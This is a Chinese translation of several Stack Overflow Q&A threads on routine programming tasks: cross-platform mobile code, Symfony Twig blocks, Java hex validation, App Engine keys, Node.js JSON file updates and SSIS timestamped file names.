如果你使用[Xamarin 的工具集](http://xamarin.com/)（以及 Visual Studio for Phone），你可以使用用 C# 编写的通用代码创建程序集，这些代码可以在所有这些平台上使用。实际的程序集二进制文件不能跨平台移植，但只要不是 UI 代码，代码就可以很容易地移植。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-21T14:01:19.423

也许是phonegap，但取决于使用了多少硬件资源和操作系统特定功能。我个人不喜欢跨平台的解决方案。

我个人的选择是使用相同的配置文件（可能是xml）并保持原始平台开发。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-21T13:40:06.310

它们都支持 javascript 应用程序，也许您可​​以将您的应用程序移植到 javascript 和 HTML5。您仍然需要执行一些特定的代码，但您将能够封装您的核心功能并在所有平台上重用它。

看不到以其他方式完成的这种可移植性。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-21T13:41:34.353

由于 Windows Phone 7 不允许您运行本机代码，因此无法通过本机代码执行此操作。据我所知，您可以在 iOS 和 Android 中使用 C 代码（使用 NDK），但不适用于 Windows Phone 7。您可能想检查 Mono 项目，看看是否可以在 iOS 和 Android 中重用 C#。HTML5 显然是一种替代方案。

# symfony - 有没有办法包含模板并隐藏他的一些块

> ID：10685989
> 
> 赞同：0
> 
> 时间：2012-05-21T13:15:32.297
> 
> 标签：symfony

或许这个问题可以转为两个问题：

如果我在 .html.twig 中包含了一个模板，我可以控制显示或隐藏包含的树枝中的某些块吗？

我可以从几个树枝布局中延伸一根树枝吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2015-05-06T14:42:07.967

我和一位同事刚刚发现了一件很酷的事情，它与这个问题有某种联系。

例如，如果您只想在调用`renderBlock`（Twig 方法）方法而不是在扩展模板时渲染块，则可以使用此技巧。

`{% if false %} {% block subject %} subject_message {% endblock %} {% endif %}`

当您调用时`renderBlock`（如此处 -> [https://stackoverflow.com/a/7580461/922165](https://stackoverflow.com/a/7580461/922165)），此块将被渲染，因为该方法不关心其他语句。

但是，当您扩展时 - 此块将永远不会显示。

例如，当您有一些其他电子邮件模板正在扩展的基本默认电子邮件模板时，这很有帮助。您可以在块中包装一些默认的电子邮件主题，并且该块不需要显示在其他模板上。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-22T00:25:58.153

我不确定这是你要找的东西，你的描述有点模糊，所以我会坚持这个问题。

你可以用中间的模板来解决这个问题。

您不能直接包含模板并修改其块 AFAIK，但您可以创建**第二个模板，扩展第一个模板**并删除块，然后在需要的地方**包含第二个模板**。

假设这是您最初想要包含的模板：

```
<div>
    This is the template you want to include (articleDetails.html.twig)
    {% block article %}
        This is some content you want to delete
    {% endblock article %}
</div> 
```

您可以尝试创建第二个模板，像这样扩展它：

```
{% extends 'articleDetails.html.twig' %}

{# This is template emptyArticle.html.twig, it deletes the article block #}
{% block article %}
{% endblock article %} 
```

然后，您可以不包含 articleDetails，而是**包含第二个模板**(emptyArticle)，您将获得第一个模板的内容，但不包含文章块的内容。您可以使用任意数量的块来执行此操作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-07-12T15:01:34.060

这已经超过了这个问题的“到期日期”，但如果其他人可能有类似的问题，我通过在包含的模板中使用 twig 变量解决了这个问题。

```
{% set myConditionalBlockToShow %}
    <span>some interesting things {{ withVariable }}</span>
{% endset %}

{% if myCondition %}
    {{ myConditionalBlockToShow }}
{% endif %} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-02T12:42:55.647

您可以在包含中传递变量

```
{% include 'template.html' with {'foo': 'bar'} %} 
```

在 template.html 中，您检查 'foo' 的值并根据值显示/隐藏您的块

或者，如果您有更复杂的模板，您可以拆分它们并在控制器中调用它们。

```
{% render url('latest_articles', { 'view': 2 }) %}

public function recentArticlesAction($view = 1) {
    // make a database call or other logic
    // to get the "$max" most recent articles
    $articles = ...;

    if($view == 2) {
        return $this->render(
           'AcmeArticleBundle:Article:recentList.html.twig',
            array('articles' => $articles)
        );
    }
    return $this->render(
        'AcmeArticleBundle:Article:recentList2.html.twig',
        array('articles' => $articles)
    );
} 
```

[http://symfony.com/doc/current/book/templating.html#embedding-controllers](http://symfony.com/doc/current/book/templating.html#embedding-controllers)

# java - 在 Java 中测试给定的数字是否为十六进制？

> ID：10685993
> 
> 赞同：-1
> 
> 时间：2012-05-21T13:15:45.863
> 
> 标签：java, exception, hex

有人可以帮忙吗？

测试给定数字是否为十六进制的程序？该号码必须由用户输入。如果不是十六进制，则必须抛出异常。异常必须是用户定义的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-21T13:17:51.500

使用`Integer.parseInt(string, 16)`.

`NumberFormatException`如果`string`无法以 base-16 解析，则会抛出。如果您想要一个用户定义的异常，则捕获`NumberFormatException`，并抛出您自己的异常。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-21T13:18:05.493

```
boolean isHex = false;
try{
    new BigInteger("ffff", 16);
    isHex = true;
}
catch(NumberFormatException ex) { } 
```

您可以使用自己的文本生成异常，如下所示：

```
throw new Exception("Some text"); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-21T13:37:47.577

或者，

```
if(!text.matches("\\p{XDigit}+") {
   throw new NotHexadecimalInputException(text);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-22T02:53:22.323

包try_catch_review；

*****我自己的例外*******

 **```
public class ItisNotHexDecException extends Exception{

    public ItisNotHexDecException()
    {
        System.out.println(" it is not hexa-decimal ");
    }

} 
```

* * *

* ***主程序 ****此处使用了上述异常****

```
import java.io*;

public class hexadec_orNot {

    public static void main(String[] args) throws ItisNotHexDecException{

        int i;
        String s =new String();
        BufferedReader br =new BufferedReader(new InputStreamReader(System.in));
        System.out.println(" enter the number ");

        try{
            s=br.readLine();
            i=Integer.parseInt(s,16);
            System.out.println("entered number is hexaDecimal :   " + i);

        }  catch(NumberFormatException e)  {

            try{
            throw new ItisNotHexDecException();
            }catch(ItisNotHexDecException ee)
            {
                System.out.println("caught exception " + ee);
            }

        }  catch(Exception e)
        {
            System.out.println(" generic ");
        }
    }

} 
```

@HI Oli - 你的意见是值得的，我感谢你。我做了什么你可以在上面的程序中看到。我相信这正是你想让我尝试的。

如本页开头所述，添加到我的原始查询中；我需要通知你们，必须从用户那里接受一个数字并将其分配给一个字符串变量——我做了这部分，你可以在上面的程序中看到。

这个问题的主要部分是必须使用“字符串函数”来执行处理。这正是我用来学习核心 Java 的一本书中所说的。

有人可以帮助我理解这个问题。我认为我做得对，因为你们可以看到上面的程序，但我自己的例外。**

# python - 从 get_by_id() 派生 Key()

> ID：10685996
> 
> 赞同：-5
> 
> 时间：2012-05-21T13:15:52.213
> 
> 标签：python, google-app-engine, key

我已经进行了用户注册，其中包括（姓名、密码、电子邮件、电话号码），现在尝试将图像也包含在 Google App 引擎数据存储中。一切正常，只是图像上传和调整大小很麻烦。但是，我现在已经让它工作了。

基本上有三个处理程序

*   第一个用于注册页面处理程序（信息测试和重定向到用户页面）

> """从注册页面获取所有请求并存储在数据库中"""
> 
> ```
> userinfo.put()
> u_id = userinfo.key().id() 
> ```
> 
> """创建cookie和哈希值是u_id"""
> 
> `self.redirect(/userpage)`

*   其次是用户页面处理程序（验证在注册处理程序中创建的 cookie，如果哈希 cookie 有效，则重定向到用户页面，否则再次重定向到注册页面）

> ```
> user_id = Users.get_by_id(u_id)
> user_key = ?  # how can I get key of user_id 
> ```
> 
> `self.render("user.html", user =user_id.user, avatar = user_id.avatar)`

*   第三是图像处理程序

> ```
> class disp_image(webapp.RequestHandler):
>   def get(self):
>       key = self.request.get('key')
>       image = Users.get(key)
>       self.response.headers['Content-Type'] = "image/png"
>       return self.response.out.write(image.avatar) 
> ```

**模板**

```
<img src="/disp?key={{avatar}}" /> 
```

**我已经解决了这个问题，进行了修订，以便更清楚地了解之前对我的问题投反对票的人。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:24:53.653

`user_key = user_id.key()`

但是为什么你的头在旋转？你实际上想要完成什么？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:51:01.213

我想你的问题是理解，key，key_name 和 id？您必须仔细阅读课程的文档`db.Key`

[https://developers.google.com/appengine/docs/python/datastore/keyclass](https://developers.google.com/appengine/docs/python/datastore/keyclass)

```
key = userinfo.key() # Returns an instance of the class `db.Key`
if key.id(): # That means the key use a numeric ID
  id = key.id()
else: # That means you can not have an ID in numeric and in string
  key_name = key.name() # That means the key use a string ID 
```

正如您在文档中所读到的，当您想创建一个对象 db.Key 时，您可以使用该方法`Key.from_path(kind, id_or_name, parent=none, namespace=None, **kwds)`用作 ID 字符串**或**长字符串的方法。

> id，指定为字符串或长整数。它不能是数字 0。

# json - 如何更新json文件中的值并通过node.js保存

> ID：10685998
> 
> 赞同：102
> 
> 时间：2012-05-21T13:15:59.063
> 
> 标签：json, node.js

如何更新 json 文件中的值并通过 node.js 保存？我有文件内容：

```
var file_content = fs.readFileSync(filename);
var content = JSON.parse(file_content);
var val1 = content.val1; 
```

现在我想更改的值`val1`并将其保存到文件中。

* * *

## 回答 #1

> 赞同：163
> 
> 时间：2015-01-27T16:23:26.153

异步执行此操作非常容易。如果您担心阻塞线程（可能），它特别有用。否则，我会建议彼得里昂的回答

```
const fs = require('fs');
const fileName = './file.json';
const file = require(fileName);

file.key = "new value";

fs.writeFile(fileName, JSON.stringify(file), function writeJSON(err) {
  if (err) return console.log(err);
  console.log(JSON.stringify(file));
  console.log('writing to ' + fileName);
}); 
```

需要注意的是，json 是在一行中写入文件而不是美化的。前任：

```
{
  "key": "value"
} 
```

将会...

```
{"key": "value"} 
```

为避免这种情况，只需将这两个额外的参数添加到`JSON.stringify`

```
JSON.stringify(file, null, 2) 
```

`null`- 表示替换函数。（在这种情况下，我们不想改变流程）

`2`- 表示要缩进的空格。

* * *

## 回答 #2

> 赞同：53
> 
> 时间：2012-05-21T13:55:18.730

```
//change the value in the in-memory object
content.val1 = 42;
//Serialize as JSON and Write it to a file
fs.writeFileSync(filename, JSON.stringify(content)); 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2019-12-12T09:24:24.030

```
// read file and make object
let content = JSON.parse(fs.readFileSync('file.json', 'utf8'));
// edit or add property
content.expiry_date = 999999999999;
//write file
fs.writeFileSync('file.json', JSON.stringify(content)); 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2019-10-19T20:15:17.413

除了上一个答案添加文件路径目录进行写操作

```
 fs.writeFile(path.join(__dirname,jsonPath), JSON.stringify(newFileData), function (err) {} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2020-11-13T19:34:03.850

任务完成后保存数据

```
fs.readFile("./sample.json", 'utf8', function readFileCallback(err, data) {
        if (err) {
          console.log(err);
        } else {
          fs.writeFile("./sample.json", JSON.stringify(result), 'utf8', err => {
            if (err) throw err;
            console.log('File has been saved!');
          });
        }
      }); 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2020-09-08T09:46:34.573

对于那些希望将项目添加到 json 集合的人

```
function save(item, path = './collection.json'){
    if (!fs.existsSync(path)) {
        fs.writeFile(path, JSON.stringify([item]));
    } else {
        var data = fs.readFileSync(path, 'utf8');  
        var list = (data.length) ? JSON.parse(data): [];
        if (list instanceof Array) list.push(item)
        else list = [item]  
        fs.writeFileSync(path, JSON.stringify(list));
    }
} 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2020-09-27T23:06:05.290

我强烈建议不要使用同步（阻塞）函数，因为[它们包含其他并发操作](https://nodejs.org/en/docs/guides/blocking-vs-non-blocking/#blocking)。相反，使用异步[fs.promises](https://nodejs.org/docs/latest-v12.x/api/fs.html#fs_fs_promises_api)：

```
const fs = require('fs').promises

const setValue = (fn, value) => 
  fs.readFile(fn)
    .then(body => JSON.parse(body))
    .then(json => {
      // manipulate your data here
      json.value = value
      return json
    })
    .then(json => JSON.stringify(json))
    .then(body => fs.writeFile(fn, body))
    .catch(error => console.warn(error)) 
```

记住`setValue`返回一个未决的承诺，你需要使用[.then 函数](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)，或者在异步函数中使用[await 操作符](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await)。

```
// await operator
await setValue('temp.json', 1)           // save "value": 1
await setValue('temp.json', 2)           // then "value": 2
await setValue('temp.json', 3)           // then "value": 3

// then-sequence
setValue('temp.json', 1)                 // save "value": 1
  .then(() => setValue('temp.json', 2))  // then save "value": 2
  .then(() => setValue('temp.json', 3))  // then save "value": 3 
```

# ssis - 如何在ssis中获取带有时间戳的文件名

> ID：10685999
> 
> 赞同：2
> 
> 时间：2012-05-21T13:16:02.507
> 
> 标签：ssis

我有一个输入文件，必须每天加载到我的桌​​子上。我收到以下格式的文件示例 sample_20120518_160754.CSV。时间戳可能会有所不同，它不是当前时间戳

我已经使用表达式来获取文件名和日期，但是如何获取文件的时间戳。

这是我用来获取文件和日期的表达式。

```
"sample_" + RIGHT("0" + (DT_STR,4,1252)DATEPART("yyyy", (DT_DATE)@[User::p_varAsOfDate]), 4) + RIGHT("0" + (DT_STR, 2, 1252)DATEPART("dd", (DT_DATE)@[User::p_varAsOfDate]), 2) + (DT_STR, 2, 1252)DATEPART("mm", (DT_DATE)@[User::p_varAsOfDate]) +"_"  +".CSV" 
```

这个表达式产生结果

sample_2012145_.CSV 现在我也想要文件的时间戳。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-21T14:00:36.917

这里的表达式也会给你 datepart + time 部分。您可以在两者之间放置额外的分隔符来完成您想要的格式。

```
(DT_STR, 4, 1252)DATEPART("yyyy", @[System::ContainerStartTime]) + 
RIGHT("0" + (DT_STR, 2, 1252)DATEPART("mm", @[System::ContainerStartTime]), 2) + 
RIGHT("0" + (DT_STR, 2, 1252)DATEPART("dd", @[System::ContainerStartTime]), 2) +
RIGHT("0" + (DT_STR, 2, 1252)DATEPART("hh", @[System::ContainerStartTime]), 2) +
RIGHT("0" + (DT_STR, 2, 1252)DATEPART("mi", @[System::ContainerStartTime]), 2) +
RIGHT("0" + (DT_STR, 2, 1252)DATEPART("ss", @[System::ContainerStartTime]), 2) + 
```

您可以编辑上述表达式并使用您选择的另一个变量。我选择 ContainerStartTime 是因为方便。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-05-29T07:27:34.970

`@[User::miFilePath]+"AnyName"+"_"+(DT_WSTR, 04) YEAR( GETDATE() )+(MONTH(GETDATE())>=10 ? (DT_WSTR, 02)MONTH(GETDATE()): "0"+(DT_WSTR, 02)MONTH(GETDATE()))+ (DAY(GETDATE())>=10? (DT_WSTR, 02)DAY(GETDATE()): "0"+(DT_WSTR, 02)DAY(GETDATE()))+"_"+RIGHT("0" + (DT_STR, 2, 1252)DATEPART("hh", GETDATE()), 2) +RIGHT("0" + (DT_STR, 2, 1252)DATEPART("mi", GETDATE()), 2) +RIGHT("0" + (DT_STR, 2, 1252)DATEPART("ss", GETDATE()), 2) + ".txt"`